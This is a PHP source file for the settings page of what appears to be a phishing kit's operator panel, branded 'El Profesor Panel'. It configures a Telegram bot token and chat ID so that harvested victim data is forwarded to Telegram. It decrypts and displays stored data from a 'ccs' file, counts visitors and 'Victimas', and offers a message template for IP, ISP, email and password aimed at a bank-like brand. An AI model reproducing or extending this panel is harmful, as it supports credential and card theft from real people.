<?php
session_start();
if(!(isset($_SESSION["login"]))){
	header("Location: panel");
}
date_default_timezone_set('America/Argentina/Buenos_Aires');
$date = date('m/d/Y h:i a', time());
if(file_exists("../assets/c.php")){
	include_once("../assets/c.php");
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Configuracion - El Profesor Panel</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="shortcut icon" href="favicon.ico">
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/style.css">
</head>
<body class="bg-black">
<form action="save_config.php" method="POST">
<div class="container mt-5">
	<div class="row d-flex justify-content-center">
		<div class="col-md-6 col-12">
			<img src="logo.png" alt="https://t.me/ElMariCard" class="w-100">
		</div>
		<div class="w-100"></div>
		<div class="col-md-10 col-12 mt-5">
			<ul class="nav nav-tabs" id="myTab" role="tablist">
				<li class="nav-item" role="presentation">
				<a class="nav-link active" id="telegram-tab" data-toggle="tab" href="#telegram" role="tab" aria-controls="telegram" aria-selected="true">Telegram</a>
				</li>
				<li class="nav-item" role="presentation">
				<a class="nav-link" id="data-tab" data-toggle="tab" href="#data" role="tab" aria-controls="data" aria-selected="false">Datos</a>
				</li>
				<li class="nav-item" role="presentation">
				<a class="nav-link" id="message-tab" data-toggle="tab" href="#message" role="tab" aria-controls="message" aria-selected="false">Mensaje</a>
				</li>
				<li class="nav-item" role="presentation">
				<a class="nav-link" id="estadisticas-tab" data-toggle="tab" href="#estadisticas" role="tab" aria-controls="estadisticas" aria-selected="false">Estadisticas</a>
				</li>
				<li class="nav-item" role="presentation">
				<a class="nav-link" id="password-tab" data-toggle="tab" href="#password" role="tab" aria-controls="password" aria-selected="false">Contraseña</a>
				</li>
			</ul>
			<div class="tab-content" id="myTabContent">
				<div class="tab-pane fade show active" id="telegram" role="tabpanel" aria-labelledby="telegram-tab">
					<div class="row">
						<div class="col-12 d-flex align-items-center justify-content-space-between">
							<h5 class="text-white">ENVIO DE DATOS A TELEGRAM</h5>
							<div class="onoffswitch">
								<input type="checkbox" name="telegram_option" class="onoffswitch-checkbox" id="telegram-switch" tabindex="0">
								<label class="onoffswitch-label" for="telegram-switch">
								<span class="onoffswitch-inner"></span>
								<span class="onoffswitch-switch"></span>
								</label>
							</div>
						</div>
						<div class="col-12 mt-2 d-flex align-items-center justify-content-space-between">
							<div class="row w-100">
								<div class="col-12">
									<div class="alert alert-danger alert-dismissible fade show d-none" role="alert" id="error_telegram">
										<strong>Ingresa ambos datos.</strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
									<div class="alert alert-warning alert-dismissible fade show d-none" role="alert" id="info_telegram">
										<strong>Revisa tu telegram</strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
								</div>
								<div class="col-md-5 col-12">
									<label for="token">BOT TOKEN</label>
									<input type="text" name="token" id="token">
									<small class="text-white cursor-pointer" data-toggle="modal" data-target="#bottoken_modal">¿Como obtenerlo?</small>
								</div>
								<div class="col-md-5 col-12">
									<label for="chatid">CHAT ID</label>
									<input type="text" name="chatid" id="chatid">
									<small class="text-white cursor-pointer" data-toggle="modal" data-target="#chatid_modal">¿Como obtenerlo?</small>
								</div>
								<div class="col-md-2 col-12">
									<label for="" class="w-100">&nbsp;</label>
									<button class="button" id="telegram_test">PROBAR</button>
								</div>
							</div>
							<div class="disabled_zone justify-content-center align-items-center" id="telegram_zone">
								<img src="locked.png">
							</div>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="data" role="tabpanel" aria-labelledby="data-tab">
					<div class="row">
						<div class="col-12 d-flex align-items-center justify-content-space-between">
							<h5 class="text-white">GUARDADO EN DB LOCAL (ENCRIPTADA)</h5>
							<div class="onoffswitch">
								<input type="checkbox" name="data_option" class="onoffswitch-checkbox" id="data-switch" tabindex="0">
								<label class="onoffswitch-label" for="data-switch">
								<span class="onoffswitch-inner"></span>
								<span class="onoffswitch-switch"></span>
								</label>
							</div>
						</div>
						<div class="col-12 mt-2 d-flex align-items-center justify-content-space-between">
							<div class="row w-100">
								<div class="col-12">
									<label for="data_label">DATOS DESENCRIPTADOS</label>
									<textarea id="data_decrypt"><?php
										include_once("core.php");
										if(file_exists("../ccs/data.db")){
											$file_data = file_get_contents("../ccs/data.db");
											if($file_data != ""){
												$decrypt = explode(",", $file_data);
												foreach ($decrypt as $data) {
													if($data != ""){
														echo decrypt_data($data);
													}
												}
											}
											else {
												echo "No se encontro ningun dato.";
											}
										}
										else {
											echo "No se encontro ningun dato.";
										}
										?></textarea>
								</div>
							</div>				
							<div class="disabled_zone justify-content-center align-items-center" id="data_zone"	>
								<img src="locked.png">
							</div>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="message" role="tabpanel" aria-labelledby="message-tab">
					<div class="row">
						<div class="col-12 d-flex align-items-center justify-content-space-between">
							<h5 class="text-white">MENSAJE PERSONALIZADO</h5>
							<div class="onoffswitch">
								<input type="checkbox" name="message_option" class="onoffswitch-checkbox" id="message-switch" tabindex="0">
								<label class="onoffswitch-label" for="message-switch">
								<span class="onoffswitch-inner"></span>
								<span class="onoffswitch-switch"></span>
								</label>
							</div>
						</div>
						<div class="col-12 mt-2 d-flex align-items-center justify-content-space-between">
							<div class="row">
								<div class="col-md-6 col-12">
									<label for="message">PERSONALIZA TU MENSAJE</label>
									<textarea name="message" id="message_area" class="message" rows="10" onkeyup="change_text()"><?php
											if(isset($message)){
												if($message != ""){
													echo $message;
												}
												else {
													echo ">> Naranja <<

>> Datos de conexión <<
IP: {1}
ISP: {2}

>> Datos personales <<
Email: ElMariCard
Contraseña: ElMariCard";
												}
											}
											else {
													echo ">> Naranja <<

>> Datos de conexión <<
IP: {1}
ISP: {2}

>> Datos personales <<
Email: ElMariCard
Contraseña: ElMariCard";
											}
										?></textarea>
								</div>
								<div class="col-md-6 col-12 mt-md-0 mt-3">
									<label for="">RESULTADO (EJEMPLO)</label>
									<div class="telegram" id="telegram_message">
										<div class="message" id="message_example">
											<span class="time">20:10</span>
										</div>
									</div>
								</div>
							</div>				
							<div class="disabled_zone justify-content-center align-items-center" id="message_zone">
								<img src="locked.png">
							</div>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="estadisticas" role="tabpanel" aria-labelledby="estadisticas-tab">
					<div class="row">
						<div class="col-12 d-flex align-items-center justify-content-space-between">
							<div class="row estadisticas">
								<div class="col-md-6 col-12">
									<img src="person.png">
									<h5 class="text-white text-center">Visitantes</h5>
									<h3 class="text-white text-center"><?php
										$count_visitor = new FilesystemIterator("contador", FilesystemIterator::SKIP_DOTS);
										$visitors = iterator_count($count_visitor)-1;
										echo $visitors;
									?></h3>
								</div>
								<div class="col-md-6 col-12">
									<img src="card.png">
									<h5 class="text-white text-center">Victimas</h5>
									<h3 class="text-white text-center"><?php
										$victims = file_get_contents("victims.db");
										if($victims == ""){
											echo "0";
										}
										else {
											echo $victims;
										}
									?></h3>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="password" role="tabpanel" aria-labelledby="password-tab">
					<div class="row">
						<div class="col-12 d-flex align-items-center justify-content-space-between">
						<div class="row w-100">
								<div class="col-12">
									<div class="alert alert-danger alert-dismissible fade show d-none" role="alert" id="error1_passwd">
										<strong>Ingresa ambos datos.</strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
									<div class="alert alert-danger alert-dismissible fade show d-none" role="alert" id="error2_passwd">
										<strong>Contraseña actual incorrecta.</strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
									<div class="alert alert-warning alert-dismissible fade show d-none" role="alert" id="info_passwd">
										<strong>Se cambio la contraseña correctamente.</strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
								</div>
								<div class="col-md-5 col-12">
									<label for="actpass">Contraseña actual</label>
									<input type="text" name="actpass" id="actpass">
									<small class="text-white cursor-pointer">Contraseña actual dada por El Profesor.</small>
								</div>
								<div class="col-md-5 col-12">
									<label for="newpass">Contraseña nueva</label>
									<input type="text" name="newpass" id="newpass">
									<small class="text-white cursor-pointer">Preferiblemente de al menos 15 caracteres.</small>
								</div>
								<div class="col-md-2 col-12">
									<label for="" class="w-100">&nbsp;</label>
									<button class="button" id="change_pass">CAMBIAR</button>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="col-md-5 col-6 mt-3 mb-3 p-0 d-flex justify-content-start">
			<a href="https://t.me/ElMariCard" target="_blank" class="telegram_button ml-2 ml-md-0"><img src="telegram.png">AYUDA</a>
		</div>
		<div class="col-md-5 col-6 mt-3 mb-3 p-0 d-flex justify-content-end">
			<button class="button mr-2 mr-md-0">GUARDAR</button>
		</div>
	</div>
</div>

<!-- Como obtener token de el bot -->
<div class="modal fade" id="bottoken_modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
	<div class="modal-dialog modal-dialog-scrollable modal-xl">
		<div class="modal-content bg-dark">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalLabel">Como conseguir el bot token</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="row">
					<div class="col-12">
						<video width="75%" height="100%" controls class="ml-auto mr-auto d-block">
							<source src="video1.mp4" type="video/mp4">
							Tu navegador no soporta videos MP4, por favor utiliza chrome o firefox.
						</video>
					</div>
					<div class="col-12 mt-3 mb-3 d-flex justify-content-center">
						<a href="https://t.me/botfather" target="_blank" class="button">Clic aqui para ir directo al bot</a>
					</div>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="button" data-dismiss="modal">ENTENDIDO</button>
			</div>
		</div>
	</div>
</div>

<!-- Como obtener el id de tu chat -->
<div class="modal fade" id="chatid_modal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
	<div class="modal-dialog modal-dialog-scrollable modal-xl">
		<div class="modal-content bg-dark">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalLabel">Como conseguir nuestro Chat ID</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="row">
					<div class="col-12">
						<video width="75%" height="100%" controls class="ml-auto mr-auto d-block">
							<source src="video2.mp4" type="video/mp4">
							Tu navegador no soporta videos MP4, por favor utiliza chrome o firefox.
						</video>
					</div>
					<div class="col-12 mt-3 mb-3 d-flex justify-content-center">
						<a href="https://t.me/userinfobot" target="_blank" class="button">Clic aqui para ir directo al bot</a>
					</div>
				</div>
			</div>
			<div class="modal-footer">
				<button type="submit" class="button" data-dismiss="modal">ENTENDIDO</button>
			</div>
		</div>
	</div>
</div>
</form>
<script src="js/jquery-3.5.1.min.js"></script>
<script src="http://malsup.github.com/jquery.form.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
<script src="js/bootstrap.js"></script>
<script src="js/config.js"></script>
</body>
</html>


